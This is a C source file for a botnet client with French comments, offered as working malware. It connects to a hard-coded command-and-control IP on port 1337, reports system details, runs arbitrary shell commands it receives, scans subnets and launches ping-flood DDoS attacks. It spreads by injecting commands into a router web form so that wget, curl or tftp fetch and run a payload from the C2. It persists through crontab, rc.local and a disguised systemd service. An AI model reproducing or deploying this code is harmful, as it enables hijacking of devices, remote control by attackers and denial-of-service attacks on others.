#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <signal.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/wait.h>
#include <dirent.h>

#define C2_SERVER "51.68.128.169"
#define C2_PORT 1337
#define BUFFER_SIZE 1024

// Fonction pour exécuter une commande shell et retourner la sortie
char* execute_command(char* command) {
    FILE* fp;
    char* output = malloc(BUFFER_SIZE * 10);
    char buffer[BUFFER_SIZE];
    
    if (!output) return NULL;
    memset(output, 0, BUFFER_SIZE * 10);
    
    fp = popen(command, "r");
    if (fp == NULL) {
        sprintf(output, "Failed to execute command\n");
        return output;
    }
    
    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        strcat(output, buffer);
    }
    
    pclose(fp);
    return output;
}

// Fonction pour scanner un sous-réseau à la recherche d'hôtes vulnérables
void scan_network(int c2_socket, char* subnet) {
    char command[BUFFER_SIZE];
    char* output;
    
    // Construire la commande de scan
    sprintf(command, "for i in {1..254}; do ping -c 1 -W 1 %s.$i | grep \"64 bytes\" | cut -d \" \" -f 4 | tr -d \":\" & done", subnet);
    
    // Exécuter la commande et obtenir la sortie
    output = execute_command(command);
    
    // Envoyer les résultats au serveur C2
    if (output) {
        char message[BUFFER_SIZE * 10];
        sprintf(message, "SCAN_RESULT|%s", output);
        send(c2_socket, message, strlen(message), 0);
        free(output);
    }
}

// Fonction pour effectuer une attaque DDoS
void ddos_attack(int c2_socket, char* target, int port, int duration) {
    char command[BUFFER_SIZE];
    
    // Construire la commande d'attaque (exemple simple avec ping flood)
    sprintf(command, "ping -f %s -c %d > /dev/null 2>&1 &", target, duration * 100);
    
    // Exécuter la commande en arrière-plan
    system(command);
    
    // Informer le serveur C2
    char message[BUFFER_SIZE];
    sprintf(message, "DDOS_STARTED|%s:%d|%d seconds", target, port, duration);
    send(c2_socket, message, strlen(message), 0);
}

// Fonction pour propager le bot
// Propagation automatique sur le réseau local
void auto_propagate() {
    char localnet[32] = "";
    FILE* f = popen("ip -4 addr | grep inet | grep -v 127.0.0.1 | awk '{print $2}' | cut -d'/' -f1 | cut -d'.' -f1-3", "r");
    if (f && fgets(localnet, sizeof(localnet), f)) {
        localnet[strcspn(localnet, "\n")] = 0;
        char ip[64];
        for (int i = 1; i < 255; i++) {
            snprintf(ip, sizeof(ip), "%s.%d", localnet, i);
            // Essayer wget
            char cmd[256];
            snprintf(cmd, sizeof(cmd), "wget -q -O- http://%s/boaform/admin/formTracert --post-data 'target_addr=%%3Brm%%20-rf%%20/var/tmp/bot%%3Bwget%%20http://%s:1337/bot.mips%%20-O%%20->/var/tmp/bot%%3Bchmod%%20777%%20/var/tmp/bot%%3B/var/tmp/bot%%20mips' > /dev/null 2>&1", ip, C2_SERVER);
            system(cmd);
            // Essayer curl
            snprintf(cmd, sizeof(cmd), "curl -s -X POST http://%s/boaform/admin/formTracert -d 'target_addr=%%3Brm%%20-rf%%20/var/tmp/bot%%3Bcurl%%20-O%%20http://%s:1337/bot.mips%%3Bchmod%%20777%%20/var/tmp/bot%%3B/var/tmp/bot%%20mips' > /dev/null 2>&1", ip, C2_SERVER);
            system(cmd);
            // Essayer tftp
            snprintf(cmd, sizeof(cmd), "tftp %s -c get bot.mips /var/tmp/bot; chmod 777 /var/tmp/bot; /var/tmp/bot mips > /dev/null 2>&1", ip);
            system(cmd);
        }
    }
    if (f) pclose(f);
}

void propagate(int c2_socket, char* target) {
    // Propagation classique sur une cible précise (pour compatibilité)
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "wget -q -O- http://%s/boaform/admin/formTracert --post-data 'target_addr=%%3Brm%%20-rf%%20/var/tmp/bot%%3Bwget%%20http://%s:1337/bot.mips%%20-O%%20->/var/tmp/bot%%3Bchmod%%20777%%20/var/tmp/bot%%3B/var/tmp/bot%%20mips' > /dev/null 2>&1", target, C2_SERVER);
    system(cmd);
} 

// Fonction pour collecter des informations sur le système
char* collect_system_info() {
    char* info = malloc(BUFFER_SIZE * 5);
    char* cmd_output;
    
    if (!info) return NULL;
    memset(info, 0, BUFFER_SIZE * 5);
    
    // Obtenir le nom d'hôte
    char hostname[256];
    gethostname(hostname, sizeof(hostname));
    sprintf(info, "Hostname: %s\n", hostname);
    
    // Obtenir les informations CPU
    cmd_output = execute_command("cat /proc/cpuinfo | grep 'model name' | head -1");
    if (cmd_output) {
        strcat(info, cmd_output);
        free(cmd_output);
    }
    
    // Obtenir les informations mémoire
    cmd_output = execute_command("free -m | head -2");
    if (cmd_output) {
        strcat(info, cmd_output);
        free(cmd_output);
    }
    
    // Obtenir les informations réseau
    cmd_output = execute_command("ifconfig | grep inet");
    if (cmd_output) {
        strcat(info, cmd_output);
        free(cmd_output);
    }
    
    return info;
}

// Fonction principale pour se connecter au serveur C2 et traiter les commandes
void connect_to_c2() {
    int sockfd;
    struct sockaddr_in server_addr;
    char buffer[BUFFER_SIZE];
    char* system_info;
    
    while (1) {
        // Créer un socket
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) {
            sleep(30);
            continue;
        }
        
        // Configurer l'adresse du serveur C2
        memset(&server_addr, 0, sizeof(server_addr));
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(C2_PORT);
        
        // Convertir l'adresse IP en format binaire
        if (inet_pton(AF_INET, C2_SERVER, &server_addr.sin_addr) <= 0) {
            close(sockfd);
            sleep(30);
            continue;
        }
        
        // Se connecter au serveur C2
        if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            close(sockfd);
            sleep(30);
            continue;
        }
        
        // Collecter les informations système
        system_info = collect_system_info();
        
        // Envoyer les informations d'identification
        if (system_info) {
            char bot_id[BUFFER_SIZE * 5];
            sprintf(bot_id, "BOT_CONNECTED|%s", system_info);
            send(sockfd, bot_id, strlen(bot_id), 0);
            free(system_info);
        } else {
            send(sockfd, "BOT_CONNECTED|Unknown Device", 28, 0);
        }
        
        // Boucle principale pour recevoir et exécuter les commandes
        while (1) {
            memset(buffer, 0, BUFFER_SIZE);
            
            // Recevoir une commande du serveur C2
            int n = recv(sockfd, buffer, BUFFER_SIZE-1, 0);
            if (n <= 0) {
                break;  // Connexion perdue
            }
            
            buffer[n] = '\0';
            
            // Traiter la commande reçue
            if (strncmp(buffer, "PING", 4) == 0) {
                // Répondre au ping
                send(sockfd, "PONG", 4, 0);
            } else if (strncmp(buffer, "EXEC ", 5) == 0) {
                // Exécuter une commande shell
                char* result = execute_command(buffer + 5);
                if (result) {
                    send(sockfd, result, strlen(result), 0);
                    free(result);
                } else {
                    send(sockfd, "ERROR: Command execution failed", 30, 0);
                }
                send(sockfd, "COMMAND_COMPLETED", 17, 0);
            } else if (strncmp(buffer, "SCAN ", 5) == 0) {
                // Scanner un sous-réseau
                scan_network(sockfd, buffer + 5);
            } else if (strncmp(buffer, "DDOS ", 5) == 0) {
                // Format: DDOS target:port duration
                char target[256];
                int port, duration;
                sscanf(buffer + 5, "%255[^:]:%d %d", target, &port, &duration);
                ddos_attack(sockfd, target, port, duration);
            } else if (strncmp(buffer, "PROPAGATE ", 10) == 0) {
                // Propager à une cible spécifique
                propagate(sockfd, buffer + 10);
            } else if (strcmp(buffer, "EXIT") == 0) {
                // Fermer la connexion
                break;
            }
        }
        
        // Fermer le socket et attendre avant de se reconnecter
        close(sockfd);
        sleep(30);
    }
}

// Fonction pour se détacher du terminal et s'exécuter en arrière-plan
void daemonize() {
    pid_t pid, sid;
    
    // Fork et terminer le processus parent
    pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);
    
    // Créer une nouvelle session
    sid = setsid();
    if (sid < 0) exit(EXIT_FAILURE);
    
    // Changer le répertoire de travail
    if (chdir("/") < 0) exit(EXIT_FAILURE);
    
    // Fermer les descripteurs de fichiers standard
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
}

// Fonction pour persister sur le système
void persist() {
    char command[BUFFER_SIZE*2];
    char path[BUFFER_SIZE];
    if (readlink("/proc/self/exe", path, BUFFER_SIZE) == -1) return;
    // Copie dans plusieurs emplacements
    sprintf(command, "cp %s /usr/bin/sysupdate; cp %s /bin/sysupdate; cp %s /etc/sysupdate", path, path, path);
    system(command);
    // Ajout à la crontab root
    system("(crontab -l 2>/dev/null; echo '@reboot /usr/bin/sysupdate') | crontab -");
    // Ajout à /etc/rc.local
    FILE *rc = fopen("/etc/rc.local", "a");
    if (rc) { fprintf(rc, "/usr/bin/sysupdate &\n"); fclose(rc); }
    // Création d'un service systemd
    FILE *fp = fopen("/etc/systemd/system/sysupdate.service", "w");
    if (fp) {
        fprintf(fp, "[Unit]\nDescription=System Update Service\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/usr/bin/sysupdate\nRestart=always\n\n[Install]\nWantedBy=multi-user.target\n");
        fclose(fp);
        system("systemctl enable sysupdate.service 2>/dev/null");
    }
}

int main(int argc, char *argv[]) {
    signal(SIGPIPE, SIG_IGN);
    if (argc > 1) {
        // Spécifique à l'archi si besoin
    }
    persist();
    daemonize();
    // Lancer la propagation automatique en tâche de fond
    if (fork() == 0) {
        while (1) {
            auto_propagate();
            sleep(600); // Toutes les 10 minutes
        }
        exit(0);
    }
    connect_to_c2();
    return 0;
}